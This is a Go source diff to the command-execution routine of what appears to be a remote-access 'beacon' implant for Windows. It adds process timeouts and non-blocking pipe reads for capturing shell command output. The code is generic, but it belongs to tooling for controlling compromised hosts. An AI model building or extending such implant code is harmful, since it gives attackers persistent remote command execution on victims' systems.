@@ -40,7 +40,9 @@ but run would just send `cmd` as args, and with a path length 0
 we have extracted path and args before call Run, so only deploy how to run a process is ok
 */
 func Run(b []byte) error {
-	path, args, err := parseCommandShell(b)
+	// third params is Wow64DisableWow64FsRedirection, used for 32bit wow64 program to access native system32 folder,
+	// but I have changed the system32 dir manually, so it is ignored
+	path, args, _, err := parseCommandShell(b)
 	if err != nil {
 		return err
 	}
@@ -144,17 +146,39 @@ func runNative(path string, args string) ([]byte, error) {
 	defer windows.CloseHandle(pI.Process)
 	defer windows.CloseHandle(pI.Thread)
 
-	// some task like tasklist wouldn't exit
-	_, _ = windows.WaitForSingleObject(pI.Process, 10*1000)
-	_, _ = windows.WaitForSingleObject(pI.Thread, 10*1000)
+	// some task like tasklist wouldn't exit, only wait for 10 seconds for output
+	// and if time out I may need to kill it manually
+	event, err := windows.WaitForSingleObject(pI.Process, 10*1000)
+	if event == uint32(windows.WAIT_TIMEOUT) {
+		// this only kill target process, if cmd.exe call tasklist.exe,
+		// only cmd.exe will be killed, and tasklist will still exist, which may make beacon cannot exit fully?
+		// but it only occurs in goland, maybe just goland continue tracking subprocesses.
+		defer windows.TerminateProcess(pI.Process, 0)
+	}
+	if err != nil {
+		return nil, err
+	}
+	//_, _ = windows.WaitForSingleObject(pI.Thread, 10*1000)
 
-	buf := make([]byte, 1024*8)
-	//var done uint32 = 4096
-	var read windows.Overlapped
-	var bytesRead uint32
-	_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
+	// use PeekNamedPipe to determine whether output exist
+	//  if lpTotalBytesAvail is 0, ReadFile will block the whole
+	var lpTotalBytesAvail uint32
+	_, _, err = peekNamedPipe.Call(uintptr(hRPipe), 0, 0, 0, uintptr(unsafe.Pointer(&lpTotalBytesAvail)), 0)
+	if err != nil && err != windows.SEVERITY_SUCCESS {
+		return nil, err
+	}
+	if lpTotalBytesAvail == 0 {
+		return []byte("no output present"), nil
+	} else if lpTotalBytesAvail > 0x80000 {
+		return []byte("output bigger than 0x80000"), nil
+	} else {
+		buf := make([]byte, lpTotalBytesAvail)
+		var bytesRead uint32
+		var read windows.Overlapped
+		_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
 
-	return buf[:read.InternalHigh], nil
+		return buf[:bytesRead], nil
+	}
 }
 
 func execNative(b []byte) error {
